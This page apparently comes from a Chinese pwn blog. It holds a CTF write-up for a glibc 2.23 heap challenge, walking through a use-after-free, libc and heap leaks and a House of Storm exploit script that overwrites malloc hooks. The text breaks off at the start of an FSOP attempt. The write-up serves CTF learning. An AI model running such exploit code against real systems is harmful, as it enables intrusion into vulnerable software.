<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/19/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/19/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/29/FSOP+Unsortedbin%20attack+%E5%A0%86%E4%B8%8AORW/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/29/FSOP+Unsortedbin%20attack+%E5%A0%86%E4%B8%8AORW/" class="post-title-link" itemprop="url">FSOP+Unsortedbin attack+堆上ORW</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-03-29 14:33:12" itemprop="dateCreated datePublished" datetime="2022-03-29T14:33:12+08:00">2022-03-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-24 01:03:57" itemprop="dateModified" datetime="2022-05-24T01:03:57+08:00">2022-05-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>x_heap</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 ./chall                                  </span><br><span class="line"><span class="number">1.</span>add</span><br><span class="line"><span class="number">2.</span><span class="keyword">delete</span></span><br><span class="line"><span class="number">3.</span>edit</span><br><span class="line"><span class="number">4.</span>show</span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> chall: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=a9ca4e5f4f591a5343f4c0d406006bde41b14d38, stripped                             </span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/chall&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11)</span> stable release versio</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 seccomp-tools dump ./chall </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;which chunk you want to delete?&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index error.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( chunk_list[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_list[index]);            <span class="comment">// UAF</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;delete success.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>申请模块：UAF漏洞，但这也意味着我们只能申请8个chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF 似乎可以溢出</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( edit_chance )                            <span class="comment">// 只能修改两次</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;which chunk you want to edit?&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">    <span class="keyword">if</span> ( index &lt; <span class="number">0</span> || index &gt; <span class="number">7</span> )               <span class="comment">// 限制index</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;index error.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( chunk_list[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (<span class="keyword">void</span> *)chunk_list[index], size_list[index]);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;edit success.&quot;</span>);</span><br><span class="line">      --edit_chance;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can only edit twice.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改模块：index 采用“int”类型，可以为负数（同时用整数溢出逃避检查）</p>
<p><strong>入侵思路</strong></p>
<p>程序限制点：</p>
<ul>
<li>程序开了沙盒（掐掉了 execve），那么就只能打 ORW </li>
<li>申请模块限制了“size”大小，只能申请 largechunk</li>
<li>申请模块只能执行8次</li>
<li>修改模块和释放模块都只能执行2次</li>
</ul>
<p>因为有UAF，所以 leak libc_base 很好办：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr<span class="number">-0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+hex(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<p>接下来试试看 House Of Storm（这里我重新调整了一下 leak 的代码）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0(unsorted)</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#2(large)</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">3952488</span></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4(unsorted)</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x564cc7b72540</span> —▸ <span class="number">0x7f2f65fd4b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x564cc7b72540</span></span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x564cc7b72da0</span> —▸ <span class="number">0x7f2f65fd4f68</span> (main_arena+<span class="number">1096</span>) ◂— <span class="number">0x564cc7b72da0</span></span><br></pre></td></tr></table></figure>
<p>接下来就要进行修改：</p>
<ul>
<li>unsorted_chunk-&gt;BK =&gt; fake_chunk</li>
<li>large_chunk-&gt;BK =&gt; fake_chunk+8</li>
<li>large_chunk-&gt;BK_nextsize =&gt; fake_chunk-0x18-5</li>
</ul>
<p>刚好用完程序的两次修改机会：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main_arena1=libc_base+<span class="number">3951480</span></span><br><span class="line">main_arena2=libc_base+<span class="number">3952488</span></span><br><span class="line">payload1=p64(main_arena1)+p64(free_hook)</span><br><span class="line">payload2=p64(main_arena2)+p64(free_hook+<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x18</span><span class="number">-5</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload1)</span><br><span class="line">edit(<span class="number">2</span>,payload2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,one_gadget)</span><br></pre></td></tr></table></figure>
<p>这里我其实想偷懒，试试看不伪造 large_chunk-&gt;FD_nextsize 可不可行，结果报错了，只好老老实实泄露 heap_base 了</p>
<p>完成攻击后还是报错了（想不明白为什么），先挂一下 House Of Storm 的代码，以后熟悉 House Of Storm 了再慢慢看：（这个题目是开了沙盒的，所以用“one_gadget”肯定不行，但我这里懒得改了）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span> <span class="comment"># 0x410 ~ 0xa9be</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to delete?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to edit?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to show?\n&#x27;</span>,<span class="built_in">str</span>(index))	</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0(unsorted)</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#2(large)</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">3952488</span></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget_list=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">2</span>]+libc_base</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=leak_addr-<span class="number">3488</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#4(unsorted)</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">main_arena1=libc_base+<span class="number">3951480</span></span><br><span class="line">main_arena2=libc_base+<span class="number">3952488</span></span><br><span class="line">heap_addr=heap_base+<span class="number">3488</span></span><br><span class="line">payload1=p64(main_arena1)+p64(malloc_hook)</span><br><span class="line">payload2=p64(main_arena2)+p64(malloc_hook+<span class="number">8</span>)+p64(heap_addr)+p64(malloc_hook-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload1)</span><br><span class="line">edit(<span class="number">2</span>,payload2)</span><br><span class="line">add(<span class="number">0x410</span>,one_gadget)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>学长说这个题要用  FSOP 来打，刚好前几天整理的 IO pwn 中就有 FSOP，当时还没有进行题目练习，可以用这个题来练练手</p>
<p>以下代码就是我的第一次尝试：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 